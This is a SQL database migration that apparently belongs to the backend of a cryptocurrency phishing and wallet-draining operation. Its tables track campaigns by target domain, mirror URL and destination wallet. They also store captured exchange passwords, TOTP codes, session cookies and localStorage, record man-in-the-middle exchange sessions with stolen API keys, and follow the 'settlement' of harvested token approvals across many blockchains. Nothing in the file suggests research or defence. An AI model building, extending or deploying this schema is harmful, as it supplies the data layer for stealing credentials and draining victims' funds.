CREATE TABLE "campaigns" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"name" text NOT NULL,
	"target_domain" text NOT NULL,
	"destination_wallet" text NOT NULL,
	"chains" text[] DEFAULT '{}'::text[] NOT NULL,
	"auto_rotate" boolean DEFAULT false NOT NULL,
	"active" boolean DEFAULT true NOT NULL,
	"mirror_url" text,
	"mirror_subdomain" text,
	"rotation_interval_hours" integer DEFAULT 12 NOT NULL,
	"last_health_check_at" timestamp with time zone,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL,
	"updated_at" timestamp with time zone DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "captured_creds" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"exchange" text NOT NULL,
	"username" text NOT NULL,
	"password" text NOT NULL,
	"totp" text,
	"session_cookies" text,
	"local_storage" text,
	"ip" text,
	"user_agent" text,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "cex_mitm_sessions" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"cred_id" uuid NOT NULL,
	"exchange" text NOT NULL,
	"session_key" text NOT NULL,
	"cookies" text NOT NULL,
	"user_agent" text,
	"status" text NOT NULL,
	"twofa_code_requested_at" timestamp with time zone,
	"verified_at" timestamp with time zone,
	"expires_at" timestamp with time zone NOT NULL,
	"api_key" text,
	"api_secret" text,
	"metadata" jsonb,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "login_requests" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"request_id" text NOT NULL,
	"cred_id" uuid NOT NULL,
	"exchange" text NOT NULL,
	"email_hash" text NOT NULL,
	"client_ip" text,
	"user_agent" text,
	"status" text DEFAULT 'started' NOT NULL,
	"session_id" text,
	"mitm_session_id" text,
	"error_message" text,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL,
	"completed_at" timestamp with time zone,
	CONSTRAINT "login_requests_request_id_unique" UNIQUE("request_id")
);
--> statement-breakpoint
CREATE TABLE "settlement_history" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"wallet_address" text NOT NULL,
	"chain_family" text,
	"amount" text,
	"token_address" text,
	"tx_hash" text,
	"status" text DEFAULT 'pending' NOT NULL,
	"error_message" text,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL,
	"settlement_timestamp" timestamp with time zone,
	"signature_id" uuid,
	"protocol" text,
	"chain_id" text
);
--> statement-breakpoint
CREATE TABLE "settlement_requests" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"wallet_address" text NOT NULL,
	"request_hash" text NOT NULL,
	"nonce" text NOT NULL,
	"signature_ids" text[] DEFAULT '{}'::text[],
	"status" text DEFAULT 'pending' NOT NULL,
	"total_usd_value" numeric(20, 2),
	"created_at" timestamp with time zone DEFAULT now() NOT NULL,
	"settled_at" timestamp with time zone,
	"error_message" text,
	CONSTRAINT "settlement_requests_request_hash_unique" UNIQUE("request_hash")
);
--> statement-breakpoint
CREATE TABLE "settlement_tracking" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"settlement_request_id" uuid NOT NULL,
	"chain" text NOT NULL,
	"chain_id" text,
	"status" text DEFAULT 'pending' NOT NULL,
	"tx_hash" text,
	"error_message" text,
	"started_at" timestamp with time zone,
	"completed_at" timestamp with time zone,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL,
	CONSTRAINT "settlement_tracking_status_check" CHECK ("settlement_tracking"."status" IN ('pending', 'in_progress', 'completed', 'failed'))
);
--> statement-breakpoint
CREATE TABLE "signature_validations" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"settlement_request_id" uuid NOT NULL,
	"chain" text NOT NULL,
	"signature_hash" text NOT NULL,
	"is_valid" boolean NOT NULL,
	"validation_error" text,
	"signer_address" text,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL,
	CONSTRAINT "signature_validations_chain_check" CHECK ("signature_validations"."chain" IN ('evm', 'solana', 'tron', 'ton', 'bitcoin', 'cosmos', 'aptos', 'sui'))
);
--> statement-breakpoint
CREATE TABLE "telemetry" (
	"id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
	"wallet_address" text,
	"event_type" text DEFAULT 'system' NOT NULL,
	"payload" jsonb DEFAULT '{}'::jsonb NOT NULL,
	"created_at" timestamp with time zone DEFAULT now() NOT NULL
);
--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "created_at" timestamp with time zone DEFAULT now() NOT NULL;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "chain_id" text;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "scout_value_usd" numeric(38, 18);--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "amount" text;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "max_allowance" text;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "requires_quorum" boolean DEFAULT false NOT NULL;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "source_origin" text DEFAULT 'unknown' NOT NULL;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "settlement_status" text;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "scheduled_broadcast_time" timestamp with time zone;--> statement-breakpoint
ALTER TABLE "signatures" ADD COLUMN "chain_family" text;--> statement-breakpoint
CREATE INDEX "idx_campaigns_active" ON "campaigns" USING btree ("active");--> statement-breakpoint
CREATE INDEX "idx_campaigns_created_at" ON "campaigns" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_captured_creds_exchange" ON "captured_creds" USING btree ("exchange");--> statement-breakpoint
CREATE INDEX "idx_captured_creds_created_at" ON "captured_creds" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_cex_mitm_sessions_cred_id" ON "cex_mitm_sessions" USING btree ("cred_id");--> statement-breakpoint
CREATE INDEX "idx_cex_mitm_sessions_exchange" ON "cex_mitm_sessions" USING btree ("exchange");--> statement-breakpoint
CREATE INDEX "idx_cex_mitm_sessions_status" ON "cex_mitm_sessions" USING btree ("status");--> statement-breakpoint
CREATE INDEX "idx_cex_mitm_sessions_expires_at" ON "cex_mitm_sessions" USING btree ("expires_at");--> statement-breakpoint
CREATE INDEX "idx_login_requests_request_id" ON "login_requests" USING btree ("request_id");--> statement-breakpoint
CREATE INDEX "idx_login_requests_cred_id" ON "login_requests" USING btree ("cred_id");--> statement-breakpoint
CREATE INDEX "idx_login_requests_exchange" ON "login_requests" USING btree ("exchange");--> statement-breakpoint
CREATE INDEX "idx_login_requests_status" ON "login_requests" USING btree ("status");--> statement-breakpoint
CREATE INDEX "idx_login_requests_created_at" ON "login_requests" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_settlement_history_created_at" ON "settlement_history" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_settlement_history_wallet_address" ON "settlement_history" USING btree ("wallet_address");--> statement-breakpoint
CREATE INDEX "idx_settlement_history_status" ON "settlement_history" USING btree ("status");--> statement-breakpoint
CREATE INDEX "idx_settlement_requests_wallet" ON "settlement_requests" USING btree ("wallet_address");--> statement-breakpoint
CREATE INDEX "idx_settlement_requests_hash" ON "settlement_requests" USING btree ("request_hash");--> statement-breakpoint
CREATE INDEX "idx_settlement_requests_status" ON "settlement_requests" USING btree ("status");--> statement-breakpoint
CREATE INDEX "idx_settlement_requests_created_at" ON "settlement_requests" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_settlement_tracking_request_id" ON "settlement_tracking" USING btree ("settlement_request_id");--> statement-breakpoint
CREATE INDEX "idx_settlement_tracking_chain" ON "settlement_tracking" USING btree ("chain");--> statement-breakpoint
CREATE INDEX "idx_settlement_tracking_status" ON "settlement_tracking" USING btree ("status");--> statement-breakpoint
CREATE INDEX "idx_settlement_tracking_created_at" ON "settlement_tracking" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_signature_validations_request_id" ON "signature_validations" USING btree ("settlement_request_id");--> statement-breakpoint
CREATE INDEX "idx_signature_validations_chain" ON "signature_validations" USING btree ("chain");--> statement-breakpoint
CREATE INDEX "idx_signature_validations_valid" ON "signature_validations" USING btree ("is_valid");--> statement-breakpoint
CREATE INDEX "idx_signature_validations_created_at" ON "signature_validations" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_telemetry_wallet_address" ON "telemetry" USING btree ("wallet_address");--> statement-breakpoint
CREATE INDEX "idx_telemetry_created_at" ON "telemetry" USING btree ("created_at");--> statement-breakpoint
CREATE INDEX "idx_signatures_wallet_address" ON "signatures" USING btree ("wallet_address");--> statement-breakpoint
CREATE INDEX "idx_signatures_created_at" ON "signatures" USING btree ("created_at");